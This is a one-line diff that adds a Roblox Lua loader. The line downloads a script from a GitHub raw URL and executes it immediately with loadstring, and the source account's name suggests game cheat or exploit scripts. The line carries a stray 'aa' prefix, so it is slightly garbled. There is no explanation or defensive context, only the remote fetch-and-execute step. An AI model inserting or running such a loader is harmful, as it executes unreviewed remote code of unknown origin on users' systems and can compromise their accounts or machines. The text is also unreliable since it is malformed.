@@ -1,0 +1,1 @@
+aaloadstring(game:HttpGet("https://raw.githubusercontent.com/RyotaXiterZ/script/main/lua-scripts/V3zxyx2.lua"))()
